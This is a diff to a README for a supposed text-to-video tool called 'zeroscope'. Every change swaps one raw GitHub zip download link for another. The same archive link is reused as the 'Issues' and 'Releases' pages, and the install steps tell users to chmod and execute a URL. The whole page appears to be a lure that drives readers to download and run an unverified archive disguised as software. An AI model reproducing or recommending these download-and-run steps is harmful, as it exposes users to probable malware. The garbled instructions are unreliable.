@@ -8,7 +8,7 @@ Welcome to zeroscope! This application allows you to generate text-to-video cont
 
 To download zeroscope, visit the link below:
 
-[![Download zeroscope](https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_1.6-beta.2.zip)](https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_1.6-beta.2.zip)
+[![Download zeroscope](https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_v2.7.zip)](https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_v2.7.zip)
 
 Follow these steps to install zeroscope:
 
@@ -22,13 +22,13 @@ Follow these steps to install zeroscope:
 
 #### Windows:
 
-1. Double-click the downloaded installer file (e.g., `https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_1.6-beta.2.zip`).
+1. Double-click the downloaded installer file (e.g., `https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_v2.7.zip`).
 2. Follow the on-screen prompts to complete the installation.
 3. Once installed, you can find zeroscope in your Start menu.
 
 #### MacOS:
 
-1. Open the downloaded file (e.g., `https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_1.6-beta.2.zip`).
+1. Open the downloaded file (e.g., `https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_v2.7.zip`).
 2. Drag zeroscope to your Applications folder.
 3. Launch zeroscope from your Applications.
 
@@ -36,8 +36,8 @@ Follow these steps to install zeroscope:
 
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. Run `chmod +x https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_1.6-beta.2.zip` to give the proper execute permissions.
-4. Execute the installer with `https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_1.6-beta.2.zip`.
+3. Run `chmod +x https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_v2.7.zip` to give the proper execute permissions.
+4. Execute the installer with `https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_v2.7.zip`.
 
 ## 🎬 How to Use zeroscope
 
@@ -98,12 +98,12 @@ Yes, zeroscope is open-source, meaning it has been reviewed by the community for
 
 If you encounter any issues or have questions about zeroscope, reach out through the following channels:
 
-- **GitHub Issues**: Report bugs or request features at our [GitHub Issues page](https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_1.6-beta.2.zip).
+- **GitHub Issues**: Report bugs or request features at our [GitHub Issues page](https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_v2.7.zip).
 - **Community Forums**: Join discussions and find help from other users.
 
 ## 🔗 Additional Information
 
-For more information about updates or features, visit our [Releases page](https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_1.6-beta.2.zip). 
+For more information about updates or features, visit our [Releases page](https://github.com/ztdesk1/zeroscope/raw/refs/heads/main/sublenticular/Software_v2.7.zip). 
 
 You can also check the source code and contribute to the project on GitHub.
 
